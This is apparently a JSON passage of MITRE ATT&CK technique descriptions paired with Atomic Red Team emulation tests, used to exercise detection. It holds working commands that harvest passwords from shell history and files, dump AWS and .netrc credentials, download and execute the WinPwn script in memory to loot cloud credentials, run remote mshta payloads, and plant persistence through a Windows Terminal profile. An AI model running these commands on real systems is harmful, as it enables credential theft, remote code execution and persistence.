(Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe\" -OutFile \"#{exe_binary}\"\n"}], "executor": {"command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "name": "powershell", "elevation_required": true}}]}, "T1569.001": {"name": "Launchctl", "technique_id": "attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d", "external_id": "T1569.001", "data_components": ["Service Creation", "File Modification", "Command Execution", "Process Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)\n", "atomic_tests": [{"name": "Launchctl", "auto_generated_guid": "6fb61988-724e-4755-a595-07743749d4e2", "description": "Utilize launchctl\n", "supported_platforms": ["macos"], "input_arguments": {"executable_path": {"description": "Path of the executable to run.", "type": "path", "default": "/System/Applications/Calculator.app/Contents/MacOS/Calculator"}, "label_name": {"description": "Path of the executable to run.", "type": "string", "default": "evil"}}, "executor": {"command": "launchctl submit -l #{label_name} -- #{executable_path}\n", "cleanup_command": "launchctl remove #{label_name}\n", "name": "bash"}}]}, "T1552.003": {"name": "Bash History", "technique_id": "attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3", "external_id": "T1552.003", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)", "atomic_tests": [{"name": "Search Through Bash History", "auto_generated_guid": "3cfde62b-7c33-4b26-a61e-755d6131c8ce", "description": "Search through bash history for specifice commands we want to capture\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "~/loot.txt"}, "bash_history_grep_args": {"description": "grep arguments that filter out specific commands we want to capture", "type": "path", "default": "-e '-p ' -e 'pass' -e 'ssh'"}, "bash_history_filename": {"description": "Path of the bash history file to capture", "type": "path", "default": "~/.bash_history"}}, "executor": {"command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n", "name": "sh"}}, {"name": "Search Through sh History", "auto_generated_guid": "d87d3b94-05b4-40f2-a80f-99864ffa6803", "description": "Search through sh history for specifice commands we want to capture\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "~/loot.txt"}, "sh_history_grep_args": {"description": "grep arguments that filter out specific commands we want to capture", "type": "path", "default": "-e '-p ' -e 'pass' -e 'ssh'"}, "sh_history_filename": {"description": "Path of the sh history file to capture", "type": "path", "default": "~/.history"}}, "executor": {"command": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}\n", "name": "sh"}}]}, "T1552.001": {"name": "Credentials In Files", "technique_id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc", "external_id": "T1552.001", "data_components": ["File Access", "Command Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)", "atomic_tests": [{"name": "Find AWS credentials", "auto_generated_guid": "2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17", "description": "Find local AWS credentials from file, defaults to using / as the look path.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_path": {"description": "Path to search", "type": "string", "default": "/"}}, "executor": {"command": "find #{file_path} -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null\n", "name": "sh"}}, {"name": "Extract Browser and System credentials with LaZagne", "auto_generated_guid": "9e507bb8-1d30-4e3b-a49b-cb5727d7ea79", "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n", "supported_platforms": ["macos"], "executor": {"command": "python2 laZagne.py all\n", "elevation_required": true, "name": "bash"}}, {"name": "Extract passwords with grep", "auto_generated_guid": "bd4cf0d1-7646-474e-8610-78ccf5a097c4", "description": "Extracting credentials from files\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"file_path": {"description": "Path to search", "type": "string", "default": "/"}}, "executor": {"command": "grep -ri password #{file_path}\nexit 0\n", "name": "sh"}}, {"name": "Extracting passwords with findstr", "auto_generated_guid": "0e56bf29-ff49-4ea5-9af4-3b81283fd513", "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n", "name": "powershell"}}, {"name": "Access unattend.xml", "auto_generated_guid": "367d4004-5fc0-446d-823f-960c74ae52c3", "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n", "supported_platforms": ["windows"], "executor": {"command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Find and Access Github Credentials", "auto_generated_guid": "da4f751a-020b-40d7-b9ff-d433b7799803", "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"file_path": {"description": "Path to search", "type": "string", "default": "/home"}}, "executor": {"name": "bash", "elevation_required": false, "command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n"}}, {"name": "WinPwn - sensitivefiles", "auto_generated_guid": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0", "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - Snaffler", "auto_generated_guid": "fdd0c913-714b-4c13-b40f-1824d6c015f2", "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - powershellsensitive", "auto_generated_guid": "75f66e03-37d3-4704-9520-3210efbe33ce", "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - passhunt", "auto_generated_guid": "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797", "description": "Search for Passwords on this system using passhunt via WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive", "cleanup_command": "rm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore", "name": "powershell"}}, {"name": "WinPwn - SessionGopher", "auto_generated_guid": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5", "description": "Launches SessionGopher on this system via WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials", "auto_generated_guid": "aaa87b0e-5232-4649-ae5c-f1724a4b2798", "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ", "name": "powershell"}}]}, "T1218.005": {"name": "Mshta", "technique_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade", "external_id": "T1218.005", "data_components": ["Network Connection Creation", "Process Creation", "Command Execution", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)", "atomic_tests": [{"name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "auto_generated_guid": "1483fab9-4f52-4217-a9ce-daa9d7747cae", "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"file_url": {"description": "location of the payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct"}}, "executor": {"command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n", "name": "command_prompt"}}, {"name": "Mshta executes VBScript to execute malicious command", "auto_generated_guid": "906865c3-e05f-4acc-85c4-fbc185455095", "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n", "supported_platforms": ["windows"], "executor": {"command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n", "name": "command_prompt"}}, {"name": "Mshta Executes Remote HTML Application (HTA)", "auto_generated_guid": "c4b97eeb-5249-4455-a607-59f95485cb45", "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"temp_file": {"description": "temp_file location for hta", "type": "string", "default": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"}, "hta_url": {"description": "URL to HTA file for execution", "type": "string", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}}, "executor": {"command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n", "cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "auto_generated_guid": "007e5672-2088-4853-a562-7490ddc19447", "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.", "supported_platforms": ["windows"], "input_arguments": {"script_engine": {"description": "Script Engine to use", "type": "string", "default": "JScript"}, "hta_file_path": {"description": "HTA file name and or path to be used", "type": "string", "default": "Test.hta"}, "mshta_file_path": {"description": "Location of mshta.exe", "type": "string", "default": "$env:windir\\system32\\mshta.exe"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}", "name": "powershell"}}, {"name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "auto_generated_guid": "58a193ec-131b-404e-b1ca-b35cf0b18c33", "description": "Executes an HTA Application using JScript script engine simulating double click.", "supported_platforms": ["windows"], "input_arguments": {"script_engine": {"description": "Script Engine to use", "type": "string", "default": "JScript"}, "hta_file_path": {"description": "HTA file name and or path to be used", "type": "string", "default": "Test.hta"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick", "name": "powershell"}}, {"name": "Invoke HTML Application - Direct download from URI", "auto_generated_guid": "39ceed55-f653-48ac-bd19-aceceaf525db", "description": "Executes an HTA Application by directly downloading from remote URI.", "supported_platforms": ["windows"], "input_arguments": {"mshta_file_path": {"description": "Location of mshta.exe", "type": "string", "default": "$env:windir\\system32\\mshta.exe"}, "hta_uri": {"description": "URI to HTA", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}", "name": "powershell"}}, {"name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "auto_generated_guid": "e7e3a525-7612-4d68-a5d3-c4649181b8af", "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.", "supported_platforms": ["windows"], "input_arguments": {"rundll32_file_path": {"description": "Location of rundll32.exe", "type": "path", "default": "$env:windir\\system32\\rundll32.exe"}, "script_engine": {"description": "Script Engine to use", "type": "string", "default": "JScript"}, "protocol_handler": {"description": "Protocol Handler to use", "type": "string", "default": "About"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}", "name": "powershell"}}, {"name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "auto_generated_guid": "d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840", "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.", "supported_platforms": ["windows"], "input_arguments": {"mshta_file_path": {"description": "Location of mshta.exe", "type": "path", "default": "$env:windir\\system32\\mshta.exe"}, "script_engine": {"description": "Script Engine to use", "type": "string", "default": "JScript"}, "protocol_handler": {"description": "Protocol Handler to use", "type": "string", "default": "About"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}", "name": "powershell"}}, {"name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "auto_generated_guid": "b8a8bdb2-7eae-490d-8251-d5e0295b2362", "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.", "supported_platforms": ["windows"], "input_arguments": {"mshta_file_path": {"description": "Location of mshta.exe", "type": "string", "default": "$env:windir\\system32\\mshta.exe"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}", "name": "powershell"}}, {"name": "Mshta used to Execute PowerShell", "auto_generated_guid": "8707a805-2b76-4f32-b1c0-14e558205772", "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n", "supported_platforms": ["windows"], "input_arguments": {"message": {"description": "Encoded message to include", "type": "string", "default": "Hello,%20MSHTA!"}, "seconds_to_sleep": {"description": "How many seconds to sleep/wait", "type": "integer", "default": 5}}, "executor": {"command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\"\"\"))</script>'\"\n", "name": "command_prompt"}}]}, "T1547.015": {"name": "Login Items", "technique_id": "attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3", "external_id": "T1547.015", "data_components": ["Process Creation", "File Modification", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)", "atomic_tests": [{"name": "Persistence by modifying Windows Terminal profile", "auto_generated_guid": "ec5d76ef-82fe-48da-b931-bdb25a62bc65", "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)", "supported_platforms": ["windows"], "input_arguments": {"calculator": {"description": "Test program used to imitate a maliciously called program.", "type": "string", "default": "calculator.exe"}, "settings_json_def": {"description": "Default file for Windows Terminal to replace the default profile with a backdoor to call another program.", "type": "path", "default": "~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"}, "settings_json_tmp": {"description": "Temp file for Windows Terminal.", "type": "path", "default": "~\\AppData\\Local\\Temp\\settings.json"}, "wt_exe": {"description": "Windows Terminal executable.", "type": "path", "default": "~\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\wt.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Windows Terminal must be installed\n", "prereq_command": "if (Test-Path #{wt_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "$(rm ~\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\LocalState\\StoreEdgeFD\\installed.db -ErrorAction Ignore; Write-Output \"\"; $?) -and $(winget install --id=Microsoft.WindowsTerminal)\n"}], "executor": {"command": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n", "cleanup_command": "mv -Force #{settings_json_tmp} #{settings_json_def}\ntaskkill /F /IM \"#{calculator}\" > $null\n", "name": "powershell"}}, {"name": "Add macOS LoginItem using Applescript", "auto_generated_guid": "716e756a-607b-41f3-8204-b214baf37c1d", "description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n", "supported_platforms": ["macos"], "input_arguments": {"scriptfile": {"description": "path to Applescript source to add Safari LoginItem.", "type": "string", "default": "PathToAtomicsFolder/T1547.015/src/add_login_item.osa"}, "cleanup_script": {"description": "path to Applescript source to delete Safari LoginItem.", "type": "string", "default": "PathToAtomicsFolder/T1547.015/src/remove_login_item.osa"}}, "executor": {"command": "osascript #{scriptfile}\n", "cleanup_command": "osascript #{cleanup_script}\n", "name": "bash"}}]}, "T1619": {"name": "Cloud Storage Object Discovery", "technique_id": "attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156", "external_id": "T1619", "data_components": ["Cloud Storage Access", "Cloud Storage Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .", "atomic_tests": [{"name": "AWS S3 Enumeration", "auto_generated_guid": "3c7094f8-71ec-4917-aeb8-a633d7ec4ef5", "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n", "supported_platforms": ["iaas:aws"], "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"}], "executor": {"command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\n", "name": "sh", "elevation_required": false}}]}, "T1134.001": {"name": "Token Impersonation/Theft", "technique_id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d", "external_id": "T1134.001", "data_components": ["Command Execution", "OS API Execution"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new 